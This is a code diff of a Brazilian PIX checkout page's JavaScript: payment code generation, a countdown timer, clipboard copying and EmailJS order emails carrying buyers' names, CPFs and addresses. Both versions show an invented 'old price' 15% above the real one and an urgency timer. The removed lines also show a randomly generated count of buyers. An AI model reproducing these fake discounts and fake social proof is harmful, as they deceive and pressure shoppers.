-                    dados_cliente: `Nome: ${name}, CPF: ${cpf}`,
-                    valor_compra: parseFloat(valor).toFixed(2).replace('.', ',')
-                });
-            } catch (err) { console.error('EmailJS:', err); }
+                let endereco_entrega = '';
+                if (addressFromUrl && cepFromUrl) {
+                    endereco_entrega = `Endereço: ${addressFromUrl}, CEP: ${cepFromUrl}`;
+                } else if (addressFromUrl) {
+                    endereco_entrega = `Endereço: ${addressFromUrl}`;
+                }
+                const dados_cliente = `Nome: ${name}, CPF: ${cpf}`;
+                const valor_compra = parseFloat(valor).toFixed(2).replace('.', ',');
+                const templateParams = {
+                    endereco_entrega: endereco_entrega,
+                    dados_cliente: dados_cliente,
+                    valor_compra: valor_compra
+                };
+                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+            } catch (err) { console.error('EmailJS error:', err); }
         }
 
         async function generatePix() {
@@ -856,177 +1271,196 @@
             if (cpf.length !== 11) { errorText.textContent = 'Informe um CPF válido.'; errorEl.classList.add('visible'); return; }
 
             const btn = document.getElementById('btn-generate-pix');
-            const orig = btn.innerHTML;
+            const originalHTML = btn.innerHTML;
             btn.innerHTML = '<div class="spinner"></div>';
             btn.disabled = true;
 
             try {
                 sendEmailJS(name, cpfRaw, phone, subtotalValue);
-                let pixCode = cpf === '11111111111'
-                    ? "00020126330014BR.GOV.BCB.PIX011111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD"
-                    : await fetchPixCode(name, cpf, phone);
-                if (pixCode) { showPixCopySection(pixCode); }
-                else { throw new Error(); }
-            } catch (e) {
+                
+                let pixCode = "";
+                if (cpf === '11111111111') {
+                    pixCode = "00020126330014BR.GOV.BCB.PIX011111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
+                } else {
+                    pixCode = await fetchPixCode(name, cpf, phone);
+                }
+
+                if (pixCode) { 
+                    showPixCopySection(pixCode); 
+                } else { 
+                    throw new Error(); 
+                }
+            } catch (err) {
                 errorText.textContent = 'Erro ao gerar PIX. Tente novamente.';
                 errorEl.classList.add('visible');
-                btn.innerHTML = orig;
+                btn.innerHTML = originalHTML;
                 btn.disabled = false;
             }
         }
 
         async function fetchPixCode(payerName, cpf, phone) {
             try {
-                const r = await fetch('/api/pix', {
+                const response = await fetch('/api/pix', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ payer_name: payerName, payer_cpf: cpf, payer_phone: phone, amount: subtotalValue.toFixed(2) })
+                    body: JSON.stringify({
+                        payer_name: payerName,
+                        payer_cpf: cpf,
+                        payer_phone: phone,
+                        amount: subtotalValue.toFixed(2)
+                    }),
                 });
-                const d = await r.json();
-                return d.success ? d.pixCode : null;
-            } catch { return null; }
+                const data = await response.json();
+                return data.success ? data.pixCode : null;
+            } catch (e) { return null; }
         }
 
-        // Timer: 8 minutes (shorter = more urgency)
-        const TIMER_DURATION = 8 * 60;
-
-        function startTimer(duration) {
+        function startTimer(duration, display) {
             let timer = duration;
             const total = duration;
-            const display = document.getElementById('pixTimer');
             const bar = document.getElementById('pixTimerBar');
-            const container = document.getElementById('timerContainer');
-            const oldPrice = subtotalValue * 1.15;
-            document.getElementById('timerPriceText').textContent = `Após o prazo o valor volta a R$ ${oldPrice.toFixed(2).replace('.', ',')}`;
+            const container = display.closest('.timer-container');
+            const interval = setInterval(function () {
+                let minutes = parseInt(timer / 60, 10);
+                let seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
 
-            const interval = setInterval(() => {
-                const m = String(Math.floor(timer / 60)).padStart(2, '0');
-                const s = String(timer % 60).padStart(2, '0');
-                display.textContent = `${m}:${s}`;
                 if (bar) bar.style.width = Math.max(0, (timer / total) * 100) + '%';
-
-                // Urgency escalation at 2 minutes
-                if (timer <= 120 && !container.classList.contains('urgent')) {
-                    container.classList.add('urgent');
-                    if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                // Increase urgency in last 3 minutes
+                if (container && timer <= 180) {
+                    container.style.background = 'linear-gradient(135deg, #fee2e2 0%, #fecaca 100%)';
+                    container.style.borderColor = '#fca5a5';
                 }
 
                 if (--timer < 0) {
                     clearInterval(interval);
-                    display.textContent = 'EXPIRADO';
-                    document.getElementById('expiredOverlay').classList.add('active');
+                    display.textContent = "EXPIRADO";
+                    document.getElementById('pixQrCode').style.opacity = "0.3";
+                    document.getElementById('btnCopiarPix').disabled = true;
+                    const cta = document.getElementById('pixPrimaryCta');
+                    if (cta) { cta.disabled = true; cta.style.opacity = '0.5'; cta.style.animation = 'none'; }
                 }
             }, 1000);
-        }
-
-        // Random social proof number
-        function updateSocialProof() {
-            const count = Math.floor(Math.random() * 20) + 25; // 25–44
-            document.getElementById('socialProofText').textContent = `${count} pessoas pagaram com PIX hoje`;
         }
 
         function showPixCopySection(qrCode) {
             document.getElementById('mainContainer').style.display = 'none';
             document.getElementById('pixScreen').style.display = 'block';
-
+            
             const oldPrice = subtotalValue * 1.15;
             const savings = oldPrice - subtotalValue;
-            document.getElementById('pixOldPrice').textContent = 'R$ ' + oldPrice.toFixed(2).replace('.', ',');
-            document.getElementById('pixTotal').textContent = 'R$ ' + subtotalValue.toFixed(2).replace('.', ',');
-            document.getElementById('pixSavingsLine').textContent = 'Economia de R$ ' + savings.toFixed(2).replace('.', ',');
+            document.getElementById('pixOldPrice').innerText = 'R$ ' + oldPrice.toFixed(2).replace('.', ',');
+            document.getElementById('pixTotal').innerText = 'R$ ' + subtotalValue.toFixed(2).replace('.', ',');
+            const sav = document.getElementById('pixSavingsLine');
+            if (sav) sav.innerText = 'Economia de R$ ' + savings.toFixed(2).replace('.', ',');
             document.getElementById('pixCopiaCola').value = qrCode;
-
+            
             const qrContainer = document.getElementById('pixQrCode');
-            qrContainer.innerHTML = '';
-            new QRCode(qrContainer, { text: qrCode, width: 174, height: 174, colorDark: '#000000', colorLight: '#ffffff', correctLevel: QRCode.CorrectLevel.H });
+            qrContainer.innerHTML = ""; 
+            new QRCode(qrContainer, {
+                text: qrCode,
+                width: 184,
+                height: 184,
+                colorDark: "#000000",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
+            });
 
-            updateSocialProof();
-            startTimer(TIMER_DURATION);
+            const fifteenMinutes = 60 * 15;
+            const display = document.querySelector('#pixTimer');
+            startTimer(fifteenMinutes, display);
 
             window.scrollTo({ top: 0, behavior: 'smooth' });
             document.body.style.backgroundColor = 'var(--bg)';
         }
 
-        function copiarPix(fromPrimary) {
-            const el = document.getElementById('pixCopiaCola');
-            el.select();
-            try { document.execCommand('copy'); } catch {}
-            if (navigator.clipboard) navigator.clipboard.writeText(el.value).catch(() => {});
+        function copiarPix(){
+          const el = document.getElementById('pixCopiaCola');
+          el.select();
+          try { document.execCommand('copy'); } catch(e) {}
+          if (navigator.clipboard) {
+              navigator.clipboard.writeText(el.value).catch(err => console.error('Error: ', err));
+          }
 
-            // ✅ Visual confirmation strip showing first chars of code
-            const code = el.value;
-            const strip = document.getElementById('copyConfirmStrip');
-            document.getElementById('copyConfirmText').textContent = `✓ Copiado: ${code.substring(0, 30)}...`;
-            strip.classList.add('visible');
+          const btn = document.getElementById('btnCopiarPix');
+          const originalText = btn.textContent;
+          btn.textContent = 'Copiado ✓';
+          setTimeout(() => { btn.textContent = originalText; }, 2500);
 
-            // Secondary button feedback
-            const btn = document.getElementById('btnCopiarPix');
-            const orig = btn.textContent;
-            btn.textContent = 'Copiado ✓';
-            setTimeout(() => { btn.textContent = orig; }, 2500);
+          const primary = document.getElementById('pixPrimaryCta');
+          if (primary) {
+              primary.classList.add('copied');
+              primary.innerHTML = '<i class="fas fa-circle-check"></i><span>Código copiado — cole no seu banco</span>';
+          }
 
-            // Primary CTA feedback
-            if (fromPrimary) {
-                const primary = document.getElementById('pixPrimaryCta');
-                primary.classList.add('copied');
-                primary.innerHTML = '<i class="fas fa-circle-check"></i><span>Código copiado — cole no seu banco</span>';
-            }
-
-            if (navigator.vibrate) navigator.vibrate(30);
+          if (navigator.vibrate) navigator.vibrate(30);
         }
 
         function showDeliveryModal() {
-            document.getElementById('delivery-modal').classList.add('active');
+            const modal = document.getElementById('delivery-modal');
+            modal.classList.add('active');
             document.body.style.overflow = 'hidden';
         }
 
         document.getElementById('modal-close-btn-delivery').addEventListener('click', () => {
-            document.getElementById('delivery-modal').classList.remove('active');
+            const modal = document.getElementById('delivery-modal');
+            modal.classList.remove('active');
             document.body.style.overflow = '';
         });
+
         document.getElementById('modal-back-to-pix').addEventListener('click', () => {
-            document.getElementById('delivery-modal').classList.remove('active');
+            const modal = document.getElementById('delivery-modal');
+            modal.classList.remove('active');
             document.body.style.overflow = '';
         });
+
         document.getElementById('modal-continue-delivery').addEventListener('click', () => {
             document.getElementById('modal-step-1').style.display = 'none';
             document.getElementById('modal-step-2').style.display = 'block';
         });
 
-        document.getElementById('delivery-contact-form').addEventListener('submit', async e => {
+        document.getElementById('delivery-contact-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             const btn = e.target.querySelector('button[type="submit"]');
-            const orig = btn.innerHTML;
+            const originalHTML = btn.innerHTML;
             btn.innerHTML = '<div class="spinner"></div>';
             btn.disabled = true;
+            const name = document.getElementById('delivery-name').value;
+            const email = document.getElementById('delivery-email').value;
+            const cpf = document.getElementById('delivery-cpf').value;
+            const phone = document.getElementById('delivery-phone').value;
             const deliveryTotal = subtotalValue * 1.46;
             try {
                 await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
                     endereco_entrega: 'Pagamento na Entrega',
-                    dados_cliente: `Nome: ${document.getElementById('delivery-name').value}, Email: ${document.getElementById('delivery-email').value}, CPF: ${document.getElementById('delivery-cpf').value}, Tel: ${document.getElementById('delivery-phone').value}`,
+                    dados_cliente: `Nome: ${name}, Email: ${email}, CPF: ${cpf}, Tel: ${phone}`,
                     valor_compra: deliveryTotal.toFixed(2).replace('.', ',')
                 });
                 document.getElementById('modal-step-2').style.display = 'none';
                 document.getElementById('modal-step-3').style.display = 'block';
-            } catch {
+            } catch (err) {
                 alert('Erro ao enviar pedido. Tente novamente.');
-                btn.innerHTML = orig;
+                btn.innerHTML = originalHTML;
                 btn.disabled = false;
             }
         });
 
-        document.getElementById('modal-close-final').addEventListener('click', () => { window.location.href = 'https://www.google.com'; });
+        document.getElementById('modal-close-final').addEventListener('click', () => {
+            window.location.href = 'https://www.google.com';
+        });
 
-        document.addEventListener('click', e => {
-            if (e.target.closest('#payment-back-btn')) window.history.back();
+        document.addEventListener('click', (e) => {
+            if (e.target.closest('#payment-back-btn')) {
+                window.history.back();
+            }
         });
 
         window.addEventListener('DOMContentLoaded', () => {
             renderPaymentOptions();
             const deliveryCpfInput = document.getElementById('delivery-cpf');
-            if (deliveryCpfInput) setupInput(deliveryCpfInput, v => v.replace(/\D/g,'').length === 11, maskCPF);
-            const deliveryPhoneInput = document.getElementById('delivery-phone');
-            if (deliveryPhoneInput) setupInput(deliveryPhoneInput, v => v.replace(/\D/g,'').length === 11, maskPhone);
+            if (deliveryCpfInput) setupCPFInput(deliveryCpfInput);
         });
     </script>
 </body>
